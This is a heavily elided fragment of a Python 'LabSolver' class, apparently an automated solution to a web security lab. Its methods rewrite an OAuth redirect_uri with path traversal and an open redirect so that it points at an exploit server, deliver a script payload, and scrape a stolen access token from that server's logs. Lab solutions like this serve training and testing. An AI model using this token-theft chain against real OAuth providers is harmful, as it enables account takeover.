...
class LabSolver:
    ...
    def sign_in_as_my_account(self):
        ...
        self.request_authorization_url = self.request_authorization_url.replace('/oauth-callback',
                                                                                '/oauth-callback/../post/next?path=' +
                                                                                self.exploit_server_url + 'exploit/')
    ...
    def deliver_exploit(self):
        ...
        </script>'''.format(self.request_authorization_url)
    ...
    def get_exploit_server_logs(self):
        ...
        self.authorization_code = re.findall(r'\?access_token=(.*) HTTP', response.text)[-1]
